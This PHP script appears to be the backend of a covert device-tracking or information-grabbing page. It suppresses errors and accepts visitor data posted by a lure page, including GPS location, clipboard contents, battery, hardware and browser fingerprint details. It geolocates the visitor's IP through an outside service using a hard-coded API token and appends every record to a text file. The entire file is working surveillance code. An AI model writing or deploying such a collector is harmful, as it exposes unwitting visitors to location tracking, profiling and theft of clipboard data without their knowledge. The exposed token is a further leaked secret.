<?php
error_reporting(0);
$networkinfo = $_POST['networkinformation'];
$batterypercentage = $_POST['batterypercentage'];
$ischarging = $_POST['ischarging'];
$width = $_POST['width'];
$height = $_POST['height'];
$platform = $_POST['platform'];
$gps = $_POST['gps'];
$localtime = $_POST['localtime'];
$devicelang = $_POST['devicelang'];
$iscookieEnabled = $_POST['iscookieEnabled'];
$useragent = $_POST['useragent'];
$deviceram = $_POST['deviceram'];
$cpuThreads = $_POST['cpuThreads'];
$referurl = $_POST['referurl'];
$clipboard = $_POST['clipboard'];
$osVersion = $_POST['osVersion'];
$browserName = $_POST['browserName'];
$browserVersion = $_POST['browserVersion'];
$deviceType = $_POST['deviceType'];
$touchScreen = $_POST['touchScreen'];
$viewportWidth = $_POST['viewportWidth'];
$viewportHeight = $_POST['viewportHeight'];
$timeZone = $_POST['timeZone'];
$colorDepth = $_POST['colorDepth'];
$pixelRatio = $_POST['pixelRatio'];
$mediaDevices = $_POST['mediaDevices'];
$preferredLanguages = $_POST['preferredLanguages'];
$ip = $_SERVER['REMOTE_ADDR'];

// Get ISP details using ipinfo.io API
$details = json_decode(file_get_contents("https://api.findip.net/{$ip}/?token=4c3897d845cc42db926699cc4bebb311"));
$isp = isset($details->org) ? $details->org : 'Unknown';

$ulke = $details->country;
date_default_timezone_set('Asia/Karachi');
$tarih = date("d-m-Y H:i:s");
$file = fopen('info.txt', 'a');
fwrite($file, "Ip Address: " .$ip."\n\n".
"Country: ".$ulke ."\n\n"."ISP: ".$isp."\n\n"."NetworkInformation: ".$networkinfo."\n\n"."Batterypercentage: ".$batterypercentage."\n\n"."Ischarging: ".$ischarging."\n\n"."ScreenWidth: ".$width."\n\n" ."ScreenHeight: ".$height."\n\n" ."Platform: ".$platform."\n\n" ."GPS: ".$gps."\n\n" ."DeviceLocalTime: ".$localtime."\n\n" ."DeviceLanguage: ".$devicelang."\n\n" ."CookieEnabled: ".$iscookieEnabled."\n\n" ."UserAgent: ".$useragent."\n\n" ."DeviceMemory: ".$deviceram."\n\n" ."CpuThreads: ".$cpuThreads."\n\n" ."Clipboard: ".$clipboard."\n\n"."OS Version: ".$osVersion."\n\n" ."Browser Name: ".$browserName."\n\n" ."Browser Version: ".$browserVersion."\n\n" ."Device Type: ".$deviceType."\n\n" ."Touch Screen: ".$touchScreen."\n\n" ."Viewport Width: ".$viewportWidth."\n\n" ."Viewport Height: ".$viewportHeight."\n\n" ."Time Zone: ".$timeZone."\n\n" ."Color Depth: ".$colorDepth."\n\n" ."Pixel Ratio: ".$pixelRatio."\n\n" ."Media Devices: ".$mediaDevices."\n\n" ."Preferred Languages: ".$preferredLanguages."\n\n"."ReferUrl: ".$referurl."\n\n\n\n");
fclose($file);
?>
